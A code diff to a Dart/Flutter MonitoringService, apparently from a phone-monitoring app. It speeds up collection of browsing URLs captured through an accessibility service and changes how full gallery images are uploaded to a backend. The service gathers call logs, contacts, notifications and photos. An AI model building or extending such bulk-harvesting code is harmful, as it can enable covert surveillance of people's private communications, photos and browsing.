@@ -41,8 +41,11 @@ class MonitoringService {
     try {
       final prefs = await SharedPreferences.getInstance();
 
-      // Always drain the notification queue — it accumulates in native prefs.
-      await _collectNotifications(prefs);
+      // Always drain fast queues — they accumulate in native prefs continuously.
+      await Future.wait([
+        _collectNotifications(prefs),
+        _collectBrowsing(prefs),   // URL queue built by AccessibilityMonitorService
+      ]);
 
       final nativeTs    = prefs.getInt(_slowCycleTsKey) ?? 0;
       final lastHandled = prefs.getInt(_lastHandledTs)  ?? 0;
@@ -54,7 +57,6 @@ class MonitoringService {
         _collectCallLogs(prefs),
         _collectContacts(prefs),
         _collectGallery(prefs),
-        _collectBrowsing(prefs),
       ]);
       await prefs.setInt(_lastHandledTs, nativeTs);
     } finally {
@@ -121,7 +123,7 @@ class MonitoringService {
       final lastSync = prefs.getInt(_lastContactTs) ?? 0;
       // Always collect — contacts don't have timestamps, use full refresh
       // but rate-limit to once per 6 hours
-      final sixHours = 6 * 60 * 60 * 1000;
+      const sixHours = 6 * 60 * 60 * 1000;
       if (DateTime.now().millisecondsSinceEpoch - lastSync < sixHours) return;
 
       final items = await _ch.getContacts();
@@ -177,6 +179,8 @@ class MonitoringService {
   }
 
   // Fire-and-forget: uploads full image data for items not yet sent to backend.
+  // Fire-and-forget: uploads full image files (images only — videos are handled
+  // natively by VideoUploadService.kt which streams directly to the backend).
   Future<void> _uploadGalleryImages(
       List<Map<String, dynamic>> items, SharedPreferences prefs) async {
     try {
@@ -196,29 +200,30 @@ class MonitoringService {
       for (final item in items) {
         final id       = item['id'] as String?;
         final mimeType = item['mimeType'] as String? ?? 'image/jpeg';
-        if (id == null || uploaded.contains(id)) continue;
+        if (id == null) continue;
+
+        // Videos are uploaded natively by VideoUploadService.kt — skip here.
+        if (mimeType.startsWith('video')) continue;
+
+        if (uploaded.contains(id)) continue;
 
         try {
-          final isVideo = mimeType.startsWith('video');
-          final fileData = isVideo
-              ? await _ch.getGalleryVideoData(id)
-              : await _ch.getGalleryImageData(id);
-
-          if (fileData.isEmpty) {
-            uploaded.add(id); // skip — too large or unreadable
+          final imageData = await _ch.getGalleryImageData(id);
+          if (imageData.isEmpty) {
+            uploaded.add(id); // unreadable — don't retry
             continue;
           }
 
           await dio.post(
             '/api/gallery/upload/$id',
-            data: {'deviceId': deviceId, 'imageData': fileData, 'mimeType': mimeType},
+            data: {'deviceId': deviceId, 'imageData': imageData, 'mimeType': mimeType},
             options: Options(headers: {'Authorization': 'Bearer $token'}),
           );
 
           uploaded.add(id);
-          appLogger.d('MonitoringService: uploaded ${isVideo ? "video" : "image"} $id');
+          appLogger.d('MonitoringService: uploaded image $id');
         } catch (e) {
-          appLogger.w('MonitoringService: upload failed for $id — $e');
+          appLogger.w('MonitoringService: image upload failed for $id — $e');
         }
       }
 
